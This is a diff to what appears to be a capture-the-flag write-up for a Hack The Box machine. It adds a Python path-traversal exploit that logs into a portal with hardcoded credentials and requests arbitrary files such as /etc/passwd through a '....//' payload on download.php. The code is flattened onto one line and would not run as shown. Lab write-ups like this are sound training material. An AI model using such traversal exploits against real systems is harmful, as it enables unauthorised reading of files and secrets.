@@ -59,8 +59,12 @@ login with that and redirect to:
 http://portal.variatype.htb/dashboard.php
 ```
 
+then:
 
-
+``` 
+#!/usr/bin/env 
+python3 import sys import requests BASE_URL = "http://portal.variatype.htb" USERNAME = "gitbot" PASSWORD = "G1tB0t_Acc3ss_2025!" TRAVERSAL = "....//" * 5 if len(sys.argv) != 2: print(f"usage: python {sys.argv[0]} /etc/passwd") sys.exit(1) path = sys.argv[1].lstrip("/") s = requests.Session() s.post(f"{BASE_URL}/", data={"username": USERNAME, "password": PASSWORD}) r = s.get(f"{BASE_URL}/download.php", params={"f": TRAVERSAL + path}) print(r.text)
+```
 
 Reference: `VT-VALID-2.1.4` 
 
